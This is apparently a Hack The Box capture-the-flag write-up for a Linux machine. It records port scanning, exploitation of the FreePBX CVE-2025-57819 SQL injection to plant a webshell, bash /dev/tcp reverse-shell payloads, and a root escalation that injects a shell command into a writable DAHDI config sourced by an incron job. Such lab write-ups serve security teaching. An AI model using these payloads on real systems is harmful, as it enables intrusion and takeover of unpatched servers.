
# #HTB 


![[Pasted image 20260721223243.png|281]]


**Machine IP:** `10.129.1.6`  
**Difficulty:** Easy  
**OS:** Linux

---

## Step 1: Reconnaissance - Port Scanning

### RustScan Results:

```
rustscan -a 10.129.1.6
```

```
Open 10.129.1.6:22
Open 10.129.1.6:80
Open 10.129.1.6:443
```

![[Pasted image 20260721223358.png]]


### Nmap Detailed Scan:

```
nmap -n -sC -sV -p 22,80,443 10.129.1.6
```


![[Pasted image 20260721223531.png]]

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 7.4 (CentOS)|
|80/tcp|HTTP|Apache 2.4.6 (CentOS) PHP/7.4.16|
|443/tcp|HTTPS|Apache 2.4.6 (CentOS) PHP/7.4.16|

**Important Finding:** HTTP redirects to `http://connected.htb/`
```
# Add to /etc/hosts
echo "10.129.1.6 connected.htb" | sudo tee -a /etc/hosts
```

---

## Step 2:  Vulnerability Discovery

#### CVE-2025-57819 - FreePBX Pre-Auth SQL Injection to RCE

> **CVE-2025-57819:** An unauthenticated SQL injection vulnerability affecting FreePBX versions 15, 16, and 17. The vulnerability exists in the Endpoint Manager component, allowing attackers to execute arbitrary SQL queries and achieve Remote Code Execution.

**Affected Versions:**
- < 15.0.66
- < 16.0.89
- < 17.0.3

**Target Version:** 16.0.40.7 (Vulnerable)

CVE-2025-57819 Exploit using python script `https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git`

![[Pasted image 20260721223959.png]]

webshell uploaded to the `http://connected.htb/this-is-an-ioc-not-actually-watchTowr-de0v292fq1.php?cmd=hostname`

![[Pasted image 20260721224156.png]]


---

## Step 5: Establishing Reverse Shell

### Start Netcat Listener:
*on new terminal*
```
nc -lvnp 4444
```

### Trigger Reverse Shell:
*on Web*
```
http://connected.htb/wt-shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.31/4444+0>%261'
```

### Reverse Shell Received:
```bash
[asterisk@connected ~]$ whoami
asterisk
[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

![[Pasted image 20260721224429.png]]


---

## Step 6: User Flag Capture

```bash
[asterisk@connected ~]$ ls
revshell.sh  user.txt
[asterisk@connected ~]$ cat user.txt
1fd6502d2af027b9724785b7576c4b9f
```

![[Pasted image 20260721224652.png]]


---

## Step 7: Privilege Escalation - Root via Incron

#### Enumeration - Find Writable Files:
```
[asterisk@connected ~]$ find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze"
/etc/dahdi/init.conf
```

#### Examine Incron Configuration:
```
[asterisk@connected ~]$ cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

**Key Finding:** When `/var/spool/asterisk/sysadmin/dahdi_restart` is modified, it triggers `/usr/sbin/sysadmin_dahdi_restart` as **root**.

### Analyze the Triggered Script:

The script `/usr/sbin/sysadmin_dahdi_restart` sources the writable file `/etc/dahdi/init.conf`, allowing command injection as root.

### Start Root Listener:
```
nc -lvnp 4445
```

### Inject Root Payload:
```
[asterisk@connected ~]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.31/4445 0>&1"' >> /etc/dahdi/init.conf
```

### Trigger Incron:
```
[asterisk@connected ~]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

![[Pasted image 20260721225037.png]]

### Root Shell Received:
```
[root@connected ~]# whoami
root
[root@connected ~]# id
uid=0(root) gid=0(root) groups=0(root)
```


![[Pasted image 20260721225102.png]]


---

## Step 8: Root Flag

```
[root@connected ~]# cat /root/root.txt
0fc6259baa647ffe181d76d031e5db41
```

![[Pasted image 20260721225132.png]]


---
---
